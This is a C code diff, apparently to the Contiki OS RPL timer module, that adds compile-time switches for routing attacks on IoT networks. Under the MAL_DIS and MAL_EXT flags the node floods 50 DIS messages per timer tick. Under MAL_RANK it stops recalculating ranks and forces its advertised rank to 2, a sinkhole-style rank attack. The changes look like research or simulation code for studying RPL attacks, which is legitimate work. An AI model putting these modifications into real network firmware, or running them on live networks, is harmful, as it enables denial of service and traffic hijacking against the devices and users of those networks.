@@ -49,7 +49,7 @@
 #include "lib/random.h"
 #include "sys/ctimer.h"
 
-#define DEBUG DEBUG_FULL
+#define DEBUG DEBUG_NONE
 #include "net/ip/uip-debug.h"
 
 /* A configurable function called after update of the RPL DIO interval */
@@ -77,6 +77,11 @@ static uint16_t next_dis;
 /* dio_send_ok is true if the node is ready to send DIOs */
 static uint8_t dio_send_ok;
 
+#if MAL_RANK || MAL_EXT 
+//EXternal attacker
+char flag_ext=0;
+#endif
+
 /*---------------------------------------------------------------------------*/
 static void
 handle_periodic_timer(void *ptr)
@@ -92,15 +97,46 @@ handle_periodic_timer(void *ptr)
       rpl_ns_periodic();
     }
   }
-  rpl_recalculate_ranks();
+  
+  #if !MAL_RANK
+    rpl_recalculate_ranks();
+  #endif
 
   /* handle DIS */
 #if RPL_DIS_SEND
   next_dis++;
-  if(dag == NULL && next_dis >= RPL_DIS_INTERVAL) {
-    next_dis = 0;
-    dis_output(NULL);
-  }
+  #if MAL_EXT
+    if (flag_ext==1){
+       int i=0;
+       PRINTF("\nSTART\n");
+      //My code
+      while (i<50){
+        i++;
+        dis_output(NULL);
+      }
+    }else{
+      if(dag == NULL && next_dis >= RPL_DIS_INTERVAL) {
+        next_dis = 0;
+        dis_output(NULL);
+      }
+    }
+  #endif  
+
+  #if MAL_RANK || !MALICIOUS
+      if(dag == NULL && next_dis >= RPL_DIS_INTERVAL) {
+        next_dis = 0;
+        dis_output(NULL);
+      }
+    
+  #elif MAL_DIS /* NOT MALICIOUS */
+  
+       int i=0;
+      //My code
+      while (i<50){
+        i++;
+        dis_output(NULL);
+      }
+  #endif  /* MALICIOUS */
 #endif
   ctimer_reset(&periodic_timer);
 }
@@ -128,6 +164,12 @@ new_dio_interval(rpl_instance_t *instance)
    */
   instance->dio_next_delay -= ticks;
   instance->dio_send = 1;
+
+
+  #if MAL_RANK
+  //Modify rank attack
+  instance->current_dag->rank=2;
+#endif
 
 #if RPL_CONF_STATS
   /* keep some stats */
@@ -207,7 +249,13 @@ rpl_reset_periodic_timer(void)
   next_dis = RPL_DIS_INTERVAL / 2 +
     ((uint32_t)RPL_DIS_INTERVAL * (uint32_t)random_rand()) / RANDOM_RAND_MAX -
     RPL_DIS_START_DELAY;
-  ctimer_set(&periodic_timer, CLOCK_SECOND, handle_periodic_timer, NULL);
+    //changed CLOCK_SECOND with next_dis
+  #if MALICIOUS && (MAL_DIS || MAL_EXT)
+    ctimer_set(&periodic_timer, CLOCK_SECOND*30, handle_periodic_timer, NULL);
+  #else
+    ctimer_set(&periodic_timer, CLOCK_SECOND, handle_periodic_timer, NULL);
+  #endif /*MALICIOUS*/
+
 }
 /*---------------------------------------------------------------------------*/
 /* Resets the DIO timer in the instance to its minimal interval. */
